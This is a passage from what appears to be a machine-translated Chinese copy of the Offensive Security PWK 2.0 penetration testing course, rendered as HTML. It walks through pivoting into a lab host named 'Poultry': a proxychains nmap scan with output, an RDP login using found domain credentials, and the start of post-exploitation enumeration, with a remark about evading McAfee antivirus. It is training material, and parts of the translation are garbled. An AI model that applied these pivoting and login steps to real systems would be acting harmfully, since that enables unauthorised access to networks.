<div style="position:absolute;top:216771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过数据库服务器 Zora 连接到内部网络。</font><font style="vertical-align: inherit;">我们也刚刚了解到，在</font></font></nobr></div>
<div style="position:absolute;top:216790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在内部网络中，共享从另一台名为 Poultry 的计算机挂载到 Zora。</font><font style="vertical-align: inherit;">我们有一个</font></font></nobr></div>
<div style="position:absolute;top:216809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">怀疑 Poultry 正在运行 Windows，但我们还不确定。</font><font style="vertical-align: inherit;">我们还发现</font></font></nobr></div>
<div style="position:absolute;top:216829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒域中用户的凭据。</font><font style="vertical-align: inherit;">这意味着应该存在域控制器</font></font></nobr></div>
<div style="position:absolute;top:216848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">某处。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:217208;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 341：家禽网络图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在尝试使用发现的凭据之前，我们将首先枚举 Poultry 以发现</font></font></nobr></div>
<div style="position:absolute;top:217258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的下一步应该是什么。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:217293;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.1</font></font></i></nobr></div>
<div style="position:absolute;top:217293;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们假设 Poultry 运行的是 Windows。</font><font style="vertical-align: inherit;">我们可以通过执行变得更加自信</font></font></nobr></div>
<div style="position:absolute;top:217350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些带有 Nmap 扫描的网络枚举。</font><font style="vertical-align: inherit;">如果 Nmap 发现任何应用程序，我们可以</font></font></nobr></div>
<div style="position:absolute;top:217369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也枚举它们。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:217579;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="184"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 184 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:217612;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:218689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:218689;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:218689;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">801</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:217708;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.1.1 网络枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要运行 Nmap 扫描，我们必须使用 ProxyChains。</font><font style="vertical-align: inherit;">使用 ProxyChains 进行网络扫描</font></font></nobr></div>
<div style="position:absolute;top:217762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">慢一点，所以我们将只从前 20 个端口开始，并在需要时扩大我们的范围。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:217824;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以通过修改代理链来加速网络扫描</font></font></i></nobr></div>
<div style="position:absolute;top:217843;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 tcp_read_time_out 和 tcp_connect_time_out 值超时</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217862;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/proxychains.conf </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">但是，不要将这些设置得太低，否则您会收到</font></font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:217882;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果不正确。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要通过 ProxyChains 运行 Nmap，我们将预先添加</font><font style="vertical-align: inherit;">我们想要运行</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:217964;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理链</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将仅使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–top-ports=20</font></font></b><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">标志</font></font><font style="font-size:14px"><font style="vertical-align: inherit;">扫描前 20 个端口</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，并将执行</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">的连接扫描</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">SOCKS 代理需要建立 TCP 连接，因此</font></font></nobr></div>
<div style="position:absolute;top:218002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">半开或 SYN 扫描不能与 ProxyChains 一起使用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">740</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 SOCKS 代理需要 TCP</font></font></nobr></div>
<div style="position:absolute;top:218021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接，ICMP 也无法通过，我们必须使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Pn</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">禁用 ping </font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:218056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20</font></font></font></b></nobr></div>
<div style="position:absolute;top:218073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:218090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-12-10 20:52 MST 开始 Nmap 7.80 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:218107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:110-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:218124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:139-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:218141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:135-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:218158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:3389-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:218175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:445-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:218192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:143-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:218209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:8080-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:218226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:218243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.20 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:218260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（1.4 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:218294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:218311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 关闭 ftp</font></font></nobr></div>
<div style="position:absolute;top:218328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22/tcp 关闭 ssh</font></font></nobr></div>
<div style="position:absolute;top:218345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23/tcp 关闭 telnet</font></font></nobr></div>
<div style="position:absolute;top:218362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25/tcp 关闭 smtp</font></font></nobr></div>
<div style="position:absolute;top:218379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 封闭域</font></font></nobr></div>
<div style="position:absolute;top:218396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 关闭 http</font></font></nobr></div>
<div style="position:absolute;top:218413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110/tcp 关闭 pop3</font></font></nobr></div>
<div style="position:absolute;top:218430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/tcp 关闭 rpcbind</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:218447;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></b></nobr></div>
<div style="position:absolute;top:218464;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:218480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143/tcp 关闭 imap</font></font></nobr></div>
<div style="position:absolute;top:218498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443/tcp 关闭 https</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:218515;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:218532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">993/tcp 封闭 imap</font></font></nobr></div>
<div style="position:absolute;top:218548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">995/tcp 关闭 pop3s</font></font></nobr></div>
<div style="position:absolute;top:218565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1723/tcp 关闭 pptp</font></font></nobr></div>
<div style="position:absolute;top:218582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3306/tcp 关闭 mysql</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:218639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">740 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/SOCKS#Comparison_to_HTTP_proxying</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:218767;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="185"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 185 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:218800;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:219877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:219877;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:219877;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">802</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:218896;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:218912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5900/tcp 封闭 vnc</font></font></nobr></div>
<div style="position:absolute;top:218929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8080/tcp 关闭 http 代理</font></font></nobr></div>
<div style="position:absolute;top:218964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：25.48 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:218983;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 961 - 使用 nmap 扫描家禽</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:219012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 961 中，Nmap 发现端口 135、139、445 和 3389 是开放的。</font><font style="vertical-align: inherit;">但是，端口 53 是</font></font></nobr></div>
<div style="position:absolute;top:219032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭，这通常在域控制器上打开。</font><font style="vertical-align: inherit;">这很可能不是域</font></font></nobr></div>
<div style="position:absolute;top:219051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找的控制器，但其他端口仍然表明这是一个 Windows 操作系统。</font><font style="vertical-align: inherit;">前 20 名</font></font></nobr></div>
<div style="position:absolute;top:219070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口没有显示任何 HTTP 应用程序正在运行，所以让我们尝试“利​​用”这台 Windows 机器</font></font></nobr></div>
<div style="position:absolute;top:219089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们发现的凭据通过 RDP 登录。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:219124;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.2</font></font></i></nobr></div>
<div style="position:absolute;top:219124;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用（或只是登录）</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:219162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们对 Windows 正在这台主机上运行有了更高的信心，我们发现</font></font></nobr></div>
<div style="position:absolute;top:219181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RDP 是开放的，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xfreerdp</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到它。</font><font style="vertical-align: inherit;">正如我们对 Nmap 所做的那样，我们将不得不预先</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:219201;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xfreerdp</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">我们提供域和用户名</font></font></font></nobr></div>
<div style="position:absolute;top:219221;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/d:sandbox</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/u:alex</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志分别。</font><font style="vertical-align: inherit;">为了重定向剪贴板，我们将使用</font></font></font></nobr></div>
<div style="position:absolute;top:219240;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+clipboard</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志，这将允许我们复制并粘贴到 Poultry。</font><font style="vertical-align: inherit;">最后，我们还将提供</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:219259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/v:10.5.5.20</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志的</font><font style="vertical-align: inherit;">主机</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:219294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard</font></font></font></b></nobr></div>
<div style="position:absolute;top:219311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:219328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:219345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.20:3389 (RDP-Server) 的证书详细信息：</font></font></nobr></div>
<div style="position:absolute;top:219362;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通用名称：POULTRY.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:219379;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主题：CN = POULTRY.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:219396;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发行人：CN = POULTRY.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:219412;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指纹：10:9c:cc:64:c6:ad:9a:bb:78:4d:b3:04:b4:fb:77:0c:1a:c6:d2:b0</font></font></nobr></div>
<div style="position:absolute;top:219429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法验证上述 X.509 证书，可能是因为您没有</font></font></nobr></div>
<div style="position:absolute;top:219447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书存储中的 CA 证书，或者证书已过期。</font></font></nobr></div>
<div style="position:absolute;top:219464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请查看 OpenSSL 文档，了解如何将私有 CA 添加到商店。</font></font></nobr></div>
<div style="position:absolute;top:219481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你相信上面的证书吗？</font><font style="vertical-align: inherit;">(Y/T/N)</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></font></b></nobr></div>
<div style="position:absolute;top:219497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码： </font></font></nobr></div>
<div style="position:absolute;top:219517;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 962 - 使用 xfreerdp 连接到主机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:219546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在初始连接期间，系统会提示我们接受证书。</font><font style="vertical-align: inherit;">输入“Y”将添加</font></font></nobr></div>
<div style="position:absolute;top:219565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书到我们的信任存储。</font><font style="vertical-align: inherit;">接下来，我们将被提示输入密码，这是我们在</font></font></nobr></div>
<div style="position:absolute;top:219585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">system_report.ps1 脚本。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:219955;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="186"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 186 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:219988;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:221065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:221065;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:221065;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">803</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:220078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:220099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据有效，我们看到的是 Windows 7 桌面（图 342）。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:220679;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 342：登录 Poultry </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:221143;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="187"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 187 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:221176;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:222253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:222253;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:222253;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">804</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:221266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.2.1.2</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:221288;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.3</font></font></i></nobr></div>
<div style="position:absolute;top:221288;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发后枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:221326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经过简短调查后，我们很快发现 Poultry 正在运行 McAfee Endpoint Security。</font></font></nobr></div>
<div style="position:absolute;top:221346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这意味着如果我们上传和使用任何恶意的可执行文件，我们将不得不非常小心</font></font></nobr></div>
<div style="position:absolute;top:221365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并确保我们避开防病毒软件 (AV)。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:221945;left:381"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 343：查找 McAfee</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:221976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先收集有关主机的一些基本信息，例如</font></font></nobr></div>
<div style="position:absolute;top:221995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows、主机名、本地用户、网络信息以及正在运行的服务。</font><font style="vertical-align: inherit;">我们将</font></font></nobr></div>
<div style="position:absolute;top:222015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systeminfo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统信息</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
